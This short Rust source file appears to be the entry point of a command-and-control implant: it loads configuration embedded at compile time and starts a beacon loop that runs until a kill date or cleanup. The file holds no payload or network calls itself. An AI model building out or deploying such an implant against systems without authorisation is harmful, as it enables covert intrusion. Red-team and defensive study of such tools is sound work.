mod beacon;
mod config;
mod core;
mod crypto;
mod transport;
mod utils;

use std::sync::Arc;

fn main() {
    // Initialize configuration from embedded compile-time values
    let config = Arc::new(config::Config::embedded());

    // Start the beacon loop (runs forever until killdate or cleanup)
    beacon::run(config);
}
